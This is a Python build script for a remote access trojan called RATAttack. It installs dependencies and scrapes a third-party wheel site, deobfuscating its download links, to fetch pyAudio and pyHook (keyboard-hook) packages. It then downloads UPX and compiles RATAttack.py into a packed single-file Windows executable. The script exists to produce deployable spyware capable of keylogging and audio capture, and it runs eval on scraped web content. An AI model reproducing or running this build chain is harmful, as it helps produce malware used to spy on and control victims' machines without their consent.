from os import system
import os
from os.path import exists
from platform import machine
import sys

auto = len(sys.argv) >= 2 and sys.argv[1] == '--yes'

if not auto:
    input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")

system('pip install -r requirements.txt')

def download_dependencies():
    arch = machine().lower()
    if arch not in ['i386', 'amd64']:
        print('Unsupported architecture:', arch)
        exit(1)

    import requests
    import re
    import sys
    v = sys.version[:3]
    v = v[0] + v[2]
    sess = requests.Session()
    txt = sess.get('https://www.lfd.uci.edu/~gohlke/pythonlibs/').text

    def dl(ml, mi): # literal translation of "dl" function in lfd uci link obfuscation attempt
        mi = mi.replace('&lt;'  , '<')
        mi = mi.replace('&#62;' , '>')
        mi = mi.replace('&#38;' , '&')
        ot = "https://download.lfd.uci.edu/pythonlibs/"
        for j in range(len(mi)):
            ot += chr(ml[ord(mi[j]) - 47])
        return ot

    def download_and_install_lfd_uci_wheel(dep):
        arch_tag = 'win_amd64' if arch == 'amd64' else 'win32' 
        if dep == 'pyAudio':
            m = re.match('.*<a(.*?)(PyAudio&#8209;.&#46;.&#46;..&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
        elif dep == 'pyHook':
            m = re.match('.*<a(.*?)(pyHook&#8209;.&#46;.&#46;.&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
        elif dep == 'opencv':
            m = re.match('.*<a(.*?)(opencv_python&#8209;.&#46;.&#46;.&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
        wheel_filename  = m.group(2).replace('&#8209;', '-').replace('&#46;', '.')
        m = re.match(' href=\'javascript:;\' onclick=\'&nbsp;javascript:dl\((.*)\);.*', m.group(1), flags=re.M|re.S)
        m = re.match('(.*), (".*")', m.group(1))
        ml = eval(m.group(1))
        mi = eval(m.group(2))

        deobfuscated_url = dl(ml,mi) # url for this dependency on python version on this architecture
        res = sess.get(deobfuscated_url, headers={ 'User-Agent': 'Mozilla/5.0' }, stream=True)
        with open(wheel_filename, "wb") as wheel:
            wheel.write(res.content)
        system('pip install ' + wheel_filename)
    
    download_and_install_lfd_uci_wheel('pyAudio')
    download_and_install_lfd_uci_wheel('pyHook')
    # download_and_install_lfd_uci_wheel('opencv')

    # check for upx in PATH otherwise download and install
    if system('upx -h') and not exists('upx395w/upx.exe'): 
        res = sess.get('https://github.com/upx/upx/releases/download/v3.95/upx-3.95-win' + ('64' if arch == 'amd64' else '32') + '.zip')
        upx_filename = 'upx.zip'
        with open(upx_filename, 'wb') as upx_zip:
            upx_zip.write(res.content)
        import zipfile
        zip_ref = zipfile.ZipFile(upx_filename, 'r')
        zip_ref.extractall('.')
        zip_ref.close()
        os.remove(upx_filename)

download_dependencies()


if not auto:
    input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')

system('pyinstaller --clean --upx-dir upx-* --onefile "RATAttack.py"')

if exists('dist/RATAttack.exe'):
    print('\n\nScript has finished')
else:
    exit(1)
